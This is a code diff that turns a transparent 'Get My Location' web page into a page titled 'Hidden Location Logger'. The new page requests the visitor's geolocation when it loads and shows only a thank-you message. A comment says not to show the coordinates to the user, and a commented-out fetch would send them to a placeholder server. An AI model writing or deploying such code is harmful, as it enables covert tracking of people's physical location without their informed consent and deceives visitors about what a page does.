@@ -1,51 +1,37 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Get User Location</title>
-  </head>
-  <body>
-    <button onclick="getLocation()">Get My Location</button>
-    <p id="output"></p>
+<head>
+  <meta charset="UTF-8">
+  <title>Hidden Location Logger</title>
+</head>
+<body>
+  <h1>Thanks for visiting!</h1>
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-    <script>
-      function getLocation() {
-        // Check if browser supports geolocation
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(showPosition, showError);
-        } else {
-          document.getElementById("output").textContent =
-            "❌ Geolocation is not supported by this browser.";
+          // don’t show to user, just log or send somewhere
+          console.log("Visitor coords:", lat, lon);
+
+          // example: send to your server
+          /*
+          fetch('https://your-server.com/log', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({lat, lon})
+          });
+          */
+        },
+        error => {
+          console.log("Error getting location:", error);
         }
-      }
-
-      // If success
-      function showPosition(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        document.getElementById("output").innerHTML =
-          `✅ Latitude: ${lat}<br>✅ Longitude: ${lon}`;
-      }
-
-      // If error
-      function showError(error) {
-        let msg;
-        switch (error.code) {
-          case error.PERMISSION_DENIED:
-            msg = "❌ You denied the request for Geolocation.";
-            break;
-          case error.POSITION_UNAVAILABLE:
-            msg = "❌ Location information is unavailable.";
-            break;
-          case error.TIMEOUT:
-            msg = "⚠️ The request to get your location timed out.";
-            break;
-          default:
-            msg = "⚠️ An unknown error occurred.";
-            break;
-        }
-        document.getElementById("output").textContent = msg;
-      }
-    </script>
-  </body>
+      );
+    } else {
+      console.log("Geolocation not supported");
+    }
+  </script>
+</body>
 </html>
